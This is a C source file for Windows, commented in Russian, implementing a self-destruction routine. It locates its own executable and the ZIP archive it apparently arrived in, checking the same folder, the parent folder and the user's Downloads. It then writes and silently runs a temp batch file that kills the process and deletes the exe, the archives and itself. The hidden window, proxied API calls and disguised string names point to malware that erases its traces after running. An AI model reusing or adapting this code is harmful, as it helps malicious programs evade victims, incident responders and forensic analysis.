#include <windows.h>
#include <stdio.h>
#include <shlobj.h> 
#include <initguid.h>

DEFINE_GUID(FOLDERID_Downloads, 
0x374DE290, 0x123F, 0x4565, 0x91, 0x64, 0x39, 0xC4, 0x92, 0x5E, 0x46, 0x7B);

int SelfDestruction()
{
    char zip_utka[] = ".zip";

    /* Получение полного пути к запущенному файлу */
    char exePath[MAX_PATH];
    ProxyGetModuleFileNameA(NULL, exePath, MAX_PATH);               // Получаем путь к текущему исполняемому файлу (самому себе)

    char exeDir[MAX_PATH];                                          // Так же нам нужно получить путь, где лежит exe файл, потому что архив может 
    strncpy(exeDir, exePath, MAX_PATH);                             // находится в той же папке, а может находится в папке выше (в зависимости от того как разархивировали)

    char *lastSlash = strrchr(exeDir, '\\');                        // Обрезаем имя файла, оставляя только путь
    if (lastSlash) {
        *lastSlash = '\0';                                  
    }

    char *exeName = strrchr(exePath, '\\');                         // Излекаем имя файла (для того чтобы получить имя процесса)
    exeName = exeName ? exeName + 1 : exePath;
    
    /* Путь ./file.zip */
    char zipPath_1[MAX_PATH];                                       // Так же нужно получить путь до zip архива, в котором находился исполняемый файл    
    strncpy(zipPath_1, exePath, MAX_PATH);                          // Копируем путь в другую переменную, чтобы получить путь к архиву                  

    char *dot_1 = strrchr(zipPath_1, '.');                          // Находим последний символ '.' в имени файла (расширение)
    if (dot_1 != NULL) {        
        strncpy(dot_1, zip_utka, MAX_PATH - (dot_1 - zipPath_1));     // Заменяем расширение на ".zip"
    } else {
        strcat(zipPath_1, zip_utka);                                  // Если расширение отсутствует, просто добавляем ".zip" в конец
    }

    /* Путь ../file.zip */
    char zipPath_2[MAX_PATH];                                       // В данном случае мы должны получить путь path/../file.zip  
    strncpy(zipPath_2, exeDir, MAX_PATH);                     
    strncat(zipPath_2, "\\..\\", MAX_PATH - strlen(zipPath_2) - 1);   
    strncat(zipPath_2, exeName, MAX_PATH - strlen(zipPath_2) - 1);  

    char *dot_2 = strrchr(zipPath_2, '.');                          // Находим последний символ '.' в имени файла (расширение)
    if (dot_2 != NULL) {        
        strncpy(dot_2, zip_utka, MAX_PATH - (dot_2 - zipPath_2));     // Заменяем расширение на ".zip"
    } else {
        strcat(zipPath_2, zip_utka);                                  // Если расширение отсутствует, просто добавляем ".zip" в конец
    }

    /* Путь C:\Users\<user>\Downloads\file.zip */
    char zipPath_3[MAX_PATH];

    PWSTR downloadsPath = NULL;

    HRESULT hr = SHGetKnownFolderPath(                              // Получаем путь к папке "Загрузки"
        &FOLDERID_Downloads,                                        // GUID папки Downloads
        0,                                                          // Флаги
        NULL,                                                       // Токен пользователя (NULL — текущий)
        &downloadsPath                                              // Указатель на результат
    );


    WideCharToMultiByte(CP_ACP, 0, downloadsPath, -1, zipPath_3, MAX_PATH, NULL, NULL);          // Конвертируем в ANSI (если нужно)
    
    strncat(zipPath_3, "\\", MAX_PATH - strlen(zipPath_3) - 1);  
    strncat(zipPath_3, exeName, MAX_PATH - strlen(zipPath_3) - 1);  

    char *dot_3 = strrchr(zipPath_3, '.');                          // Находим последний символ '.' в имени файла (расширение)
    if (dot_3 != NULL) {        
        strncpy(dot_3, zip_utka, MAX_PATH - (dot_3 - zipPath_3));     // Заменяем расширение на ".zip"
    } else {
        strcat(zipPath_3, zip_utka);                                  // Если расширение отсутствует, просто добавляем ".zip" в конец
    }


    /* Создание bat файла */
    char batPath[MAX_PATH];
    ProxyGetTempPathA(MAX_PATH, batPath);                           // Получаем путь к temp-папке
    strcat(batPath, "name_bat_file.bat");                           // Имя бат файла

    char code_bat_file_utka[] =  "@echo off & taskkill /F /IM %s > nul 2>&1 & ping 127.0.0.1 -n 6 > nul & del %s & del %s & del %s & del %s & del %%~f0";
    /*
    "@echo off\n"
    "taskkill /F /IM \"%s\" > nul 2>&1\n"                   // Завершаем процесс по имени
    "ping 127.0.0.1 -n 6 > nul\n"                           // Задержка ~4 сек
    "del \"%s\"\n"                                          // Удаляем .exe
    "del \"%s\"\n"                                          // Удаляем .zip
    "del \"%%~f0\"\n",                                      // Удаляем сам .bat
    */

    FILE *bat = fopen(batPath, "w");                        // Создаем bat файл
    if (bat) {
        fprintf(bat,
            code_bat_file_utka,
            exeName, zipPath_1, zipPath_2, zipPath_3, exePath, exePath);
        fclose(bat);                                        // Закрываем файл
    }

    char open_utka[] = "open";

    ProxyShellExecuteA(                                     // Запускаем bat-файл с помощью ShellExecuteA (без отображаения окна)
        NULL,                                               // Дескриптор окна (NULL - текущее)
        open_utka,                                          // Операция открыть
        // "open",                                      
        batPath,                                            // Путь к bat-файлу
        NULL,                                               // Без доп параметров
        NULL,                                               // Рабочая директория (по умолчанию)
        SW_HIDE                                             // Скрываем окно при запуске
    );

    return 0;
}